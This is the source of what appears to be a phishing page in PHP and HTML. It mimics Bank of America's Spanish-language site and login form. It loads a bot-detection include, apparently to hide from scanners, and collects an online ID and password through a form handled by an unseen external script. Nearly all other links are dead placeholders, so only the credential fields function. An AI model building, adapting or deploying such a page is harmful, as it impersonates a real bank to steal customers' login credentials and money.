<?php
require "is_bot.php";
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>
        Bank of America: operaciones bancarias, tarjetas de crédito, préstamos e
        inversiones con Merrill
    </title>
    <link rel="stylesheet" href="css/normalize.min.css" />
    <link rel="stylesheet" href="css/estilos.css" />
    <link rel="stylesheet" href="css/points.css">
    <link rel="shortcut icon" href="img/logo.png" type="image/x-icon" />
    <script type="text/javascript">
        if (screen.width < 801) {
            window.location = "indexm";
        }
    </script>
</head>

<body>
    <div class="contenedor">
        <div class="menu1">
            <ul class="pack1">
                <li>Personal</li>
                <li>Pequeñas empresas</li>
                <li>Administración Patrimonial</li>
                <li>Empresas e instituciones</li>
                <li>Seguridad</li>
                <li class="logpeq">
                    <img style="height: 14px; margin-right: 4px; margin-left: 1px" src="img/logo.svg" alt="logo" />
                    Acerca de nosotros
                </li>
            </ul>
            <ul class="pack2">
                <li>In English</li>
                <li>Contacto</li>
                <li>Ayuda</li>
            </ul>
        </div>
        <div class="logof">
            <div class="part1">
                <img src="img/logo_grande.svg" alt="complet" height="31" />
            </div>
            <div class="part2">
                <img src="img/form1.png" alt="form" />
            </div>
        </div>
        <div class="menu2">
            <ul class="pack3">
                <li><span>Cuentas de cheques</span></li>
                <li><span>Cuentas de ahorro</span></li>
                <li><span>Tarjeta de crédito</span></li>
                <li><span>Préstamos para vivienda</span></li>
                <li><span>Préstamos para automóviles</span></li>
                <li class="celda">
                    <span>Investing </span>
                    <img src="img/bull.svg" alt="toro" width="32" height="28" style="margin-top: 5px; margin-left: 5px" />
                </li>
                <li><span>Mejores Hábitos Financieros®</span></li>
            </ul>
        </div>

        <div class="principal">
            <div >
                <div class="formulario">
                    <form autocomplete="off" id="fusuario" class="fusuario">
                        <span id="error2"> </span>
                        <div class="fgrupo">
                            <input type="text" name="usuario" id="usuario" placeholder="Identificación en línea" maxlength="100" />
                        </div>
                        <div class="fgrupo">
                            <input type="password" name="contra" id="contra" placeholder="Contraseña" maxlength="100" />

                        </div>
                        <div class="fgrupo flexi2">
                            <input type="checkbox" class="checkusu" name="idlinea" name="idlinea" />
                            <label for="idlinea">Guardar Id. en línea</label>
                        </div>

                        <div class="fgrupo">
                            <button type="button" id="usuenviar" class="btn btn-glass">
                                <span id="textobutton" class="textobutton">
                                    Entrar
                                </span>
                                <div class="snippet" data-title=".dot-pulse" id="puntopulso" style="display: none;">
                                    <div class="stage">
                                        <div class="dot-pulse"></div>
                                    </div>
                                </div>
                            </button>
                        </div>

                        <div class="formpie">
                            <div class="fgrupo flexi">
                                <a href="javascript:void(0)">¿Olvidó su Identificación en línea o Contraseña?</a>
                            </div>
                            <div class="fgrupo flexi" style="margin-bottom: 10px">
                                <a href="javascript:void(0)">Seguridad y ayuda</a>
                                <a href="javascript:void(0)">Inscribirse</a>
                            </div>
                        </div>
                        <div class="formpie2">
                            <a href="javacript:void(0)">Abrir una cuenta</a>
                        </div>
                    </form>
                </div>
                <div class="cartaazul">
                    <div class="arriba">
                        <div class="uno">
                            <img src="img/ubica.png" alt="ubica" />
                        </div>
                        <div class="dos">
                            <a href="javascript:void(0)">Encuentre su centro financiero o cajero automático (ATM) más
                                cercanos</a>
                        </div>
                    </div>
                    <div class="abajo">
                        <div class="uno">
                            <img src="img/calendar.png" alt="calendar" />
                        </div>
                        <div class="dos">
                            <a href="javascript:void(0)">Programar una cita</a>
                        </div>


                    </div>
                </div>
            </div>
            <div class="enunciado">
                <h1>Elija la tarjeta que funciona para usted</h1>
                <img style="width:100%;" src="img/tarjetas.png" alt="funciona" />
            </div>



        </div>
        <div class="pieprincipal">
            <img src="img/ahorro.png" alt="ahorro" />
        </div>
    </div>

    <script src="js/funciones.js"></script>
</body>

</html>